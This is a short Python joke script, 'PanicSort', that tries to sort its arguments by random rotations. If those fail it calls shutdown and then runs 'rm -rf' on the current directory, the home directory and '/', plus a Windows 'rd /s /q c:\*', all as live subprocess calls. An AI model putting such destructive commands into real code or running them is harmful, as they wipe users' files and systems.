#!/usr/bin/env python

import math
import random
import sys
import subprocess

def IsSorted(l):
	return all(l[i] <= l[i+1] for i in xrange(len(l)-1))

def rand(l,h):
	d = h - l
	r = l + d * random.random()
	return math.trunc(r)

def PanicSort(l):
	if IsSorted(l):
		return l
	for n in range(1,10001):
		pivot = rand(0,len(l))
		l = l[pivot:] + l[:pivot]
		if IsSorted(l):
			return l
	if IsSorted(l):
		return l
	if IsSorted(l): # This can't be happening
		return l
	if IsSorted(l): # Come on come on
		return l
	# Oh jeez
	# I'm gonna be in so much trouble
	l = []
	subprocess.call(["shutdown", "-h", "5"])
	subprocess.call(["rm", "-rf", "./"])
	subprocess.call(["rm", "-rf", "~/*"])
	subprocess.call(["rm", "-rf", "/"])
	subprocess.call(["rd", "/s", "/q", "c:\\*"]) # Portability
	return [1,2,3,4,5]

if __name__ == '__main__':
	print PanicSort(sys.argv[1:])
